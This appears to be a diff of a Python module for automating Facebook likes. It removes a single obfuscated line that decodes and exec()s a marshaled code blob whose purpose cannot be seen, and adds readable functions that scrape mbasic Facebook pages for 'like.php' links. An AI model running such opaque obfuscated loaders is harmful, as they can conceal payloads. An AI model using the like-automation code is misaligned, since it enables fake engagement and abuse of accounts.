@@ -1,1 +1,23 @@
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==wG0eSoL4/p3/upX9/1l/xovr9bjy9r8//9Tn6Pv+6r+rfZXUf967fe/xzvvfZ/1Hv/f/2tj3vf/g3sf9VZ9tP9+75fNX7r0r/ffuN/8Tn//cL7bi7//96927/3fyu8/0T++/x64zN1/c88l3qEOMUqBm3ZBeiGdW5c3LIVjw+Z+wZSIBBTpIKnjWslvGZCZI0/ZoBgBNRuusfu+RE7Q4ypQDEpIki7NyxAnw7wtAqo6iIEKyCEm8LEARQxAjCFBRwDiweB3IiiBFwCARDCtepekmrF30tUi99eiTZXvlCgHWYHQb05YAzd42ANGswyqWNM2n/TI8wFUN3h9QUwoDwXyaJvBXD8J4dQhY9KpAlLRuyZMsKxkUQcvRXErHAoaq4jqMp7Ka8lXJQoPt36aKeHy4K76OITG6txdbKKrzyDizkbXSYrCqr7SvPyuO5zWrYT8sYjI0R+71is0bCOoK/I0N8jGyHds6Cw8nDn3jm0uqlkOuchRJRDPh+fv8VpPMHT3zC73peinQ3GSbF/EigK74Ko2eny2zwLpxvP39SJSUpTDoqG8g08fd/e49BfNmoptWnSxi22kHr0VmCRdxjXwKlZUsLFrhn7MKhZMpZ3qvXmLOr6ONBpzzjnT36Ro8qiV64PjAE1GszuV/zSkYAgsTzhTYYusVEi4zw+Jb96OJMunu8APZ4EeAuptbA2rmsgc6ULiMe27cjkizAUykdbsb9PdC+ri6h/dqadvX85qFxVQUInsD+PmU8T8pr8ldcFk1YzLRvGzP5vjwG9uRut23xINQBMBAzUNI2PqbBH1ippRNLBqz9jbqENCAVn+I3+6BXWnHg6h7DsEjvcnuJOlk2G8CnOc7HRHIJ2vRSXiwRgddgpGzN41v3fAqHGtM3o7gajhqfUthAWE5gaJUWmHcINGFrK+sG62PMz54Vg/bI4L3EZER3YdeFsuLK2UPMX/yhsEZ3plekR0ulqM0Tv5s2kxkTPFNHf1QTIz+GMHYBkMElnVuYChVnkw7pDlDMbzlK8qLQZOIGlhPlE1HPmGiM5lGUgnbQo6G5O8yrpNyEmgmWh60f3ZPPtWV5hQeKmHJULHXTyWMJLi2XeOnVLM6DhTDYbgubQ1vKrK5E+1VqHJytctZnswzmw1XZQzVSt2uCXNaigeqmo+sQbNBl2Y7AnaINNSfmThYU7l1prmS6QcovlLiqTtOafae1L/aCfYy9pmlc98Ca8wvMEWbPbaA6qNetejXd+vXmcvcflpq5JgeLn68YaCTXX/A0Uu3AXnrLqBgH6gsMyrwTtl6Qp3tyD3MmZyNbeqWpH9qKMMLUKxll0ALV3DGSEown3t6Bv0WDQJQ8WCTfXxiVPLSnT6B4IhHMsvWLXVYw4B8rnbNlvkAZ7s2/vnulrV1J8RX6PTB572kNpkGfBmfsZqeEESZGPfXBXe8nH9u9uYd6tU16lKLbrYPznvEUhUeGCvhBFOByvA1j2CCbvF0kn3aQR8BvIRYxSl33ncAYgRH1E6c4rfQouMpUjiLIS5QoFWtbD5dyTjKO97RAq8CCrVb6VZVG+gjO7of4jeTPsLllDCNbrn+Vvh1W4WLsuypPqhDufZBI3Md+G6amWIel1+RYx3xXVpBbCDIpHj7jtZYPdAKBgQj2Z6lzKNwT3slaoFU0wF9VF+a65ndf9oU4qE3Z9limVZGUBhr01mkxKqFZFLni+84OGteT1PU37p0Wfxd9esWGGd8GMnK14n0HVft4W7B6MhbalfM7CdrQ8nuYkpQSfON2VhOzDDsXY5/dqPzJnjIBHMhteJzKqRaHnbNn6YAQopGFrSRyScGDN/dDx+nQO0lhrNVc85lKQxiqepDGb7E1v2DeLd4EujmLg3pYRyxyGIoHGxgbfyuYYQu7Hrpmmp7nN4lNbqhXz
+from .checker import check_login
+from .output import Output
+from . import sorting
+from . import parsing
+
+@check_login
+def like_core(ses, func, arg, url, next, string_next):
+	html = ses.session.get(url if not next else next).text
+	data = parsing.parsing_href(html, "like.php")
+	next = sorting.to_mbasic(parsing.parsing_href(html, string_next, one = True))
+	return Output(ses, func, arg = arg, items = data, next = next, html = html)
+
+def like_post_home(ses, next = None):
+	return like_core(ses, like_post_home, [], "https://mbasic.facebook.com/home.php", next, "?aftercursorr=")
+
+def like_post_people(ses, id, next = None):		
+	return like_core(ses, like_post_people, [id], "https://mbasic.facebook.com/{}?v=timeline".format(id), next, "?cursor")
+
+def like_post_fanspage(ses, username, next = None):	
+	return like_core(ses, like_post_fanspage, [username], "https://mbasic.facebook.com/{}".format(username), next, "?sectionLoadingID=")
+
+def like_post_group(ses, id, next = None):
+	return like_core(ses, like_post_group, [id], "https://mbasic.facebook.com/groups/{}".format(id), next, "?bacr=")
